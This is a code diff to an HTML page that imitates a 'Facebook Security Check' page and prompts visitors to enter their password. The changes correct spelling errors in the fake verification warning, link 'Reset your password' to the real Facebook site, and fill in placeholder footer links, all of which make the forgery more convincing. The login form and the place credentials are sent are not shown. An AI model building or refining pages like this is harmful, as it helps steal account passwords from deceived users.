@@ -20,9 +20,9 @@
 				<h3>Facebook Security Check</h3>
 			</div>
 			<div class="red-box">
-				<p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
-				<p>Enter your passwor for security reason (make sure yuor caps lock is off)</p>
-				<p>Forgot your password ? <a href="">Request new one</a>
+				<p style="font-weight:bold; font-size:13px">Verification needed to understand it's you</p>
+				<p>Enter your password for security reasons (make sure you have caps lock turned off)</p>
+				<p>Forgot your password? <a href="http://www.facebook.com">Reset your password</a>
 			</div>
 
 			<div class="login-form">
@@ -42,27 +42,27 @@
 		
 		<footer>
 			<ul>
-				<li><a href="">Mobile</a></li>
-				<li><a href="">Find Friends</a></li>
-				<li><a href="">Badges</a></li>
-				<li><a href="">People</a></li>
-				<li><a href="">Pages</a></li>
-				<li><a href="">Apps</a></li>
-				<li><a href="">Games</a></li>
-				<li><a href="">Music</a></li>
-				<li><a href="">Locations</a></li>
+				<li><a href="/">Mobile</a></li>
+				<li><a href="/">Find Friends</a></li>
+				<li><a href="/">Badges</a></li>
+				<li><a href="/">People</a></li>
+				<li><a href="/">Pages</a></li>
+				<li><a href="/">Apps</a></li>
+				<li><a href="/">Games</a></li>
+				<li><a href="/">Music</a></li>
+				<li><a href="/">Locations</a></li>
 			</ul>
 			<ul>
-				<li><a href="">Topics</a></li>
-				<li><a href="">About</a></li>
-				<li><a href="">Create Ad</a></li>
-				<li><a href="">Create Page</a></li>
-				<li><a href="">Devepers</a></li>
-				<li><a href="">Careers</a></li>
-				<li><a href="">Privacy</a></li>
-				<li><a href="">Cookies</a></li>
-				<li><a href="">Terms</a></li><br />
-				<li><a href="#">Help</a></li>
+				<li><a href="/">Topics</a></li>
+				<li><a href="/">About</a></li>
+				<li><a href="/">Create Ad</a></li>
+				<li><a href="/">Create Page</a></li>
+				<li><a href="/">Devepers</a></li>
+				<li><a href="/">Careers</a></li>
+				<li><a href="/">Privacy</a></li>
+				<li><a href="/">Cookies</a></li>
+				<li><a href="/">Terms</a></li><br />
+				<li><a href="/">Help</a></li>
 			</ul>
 		</footer>
 	</section>
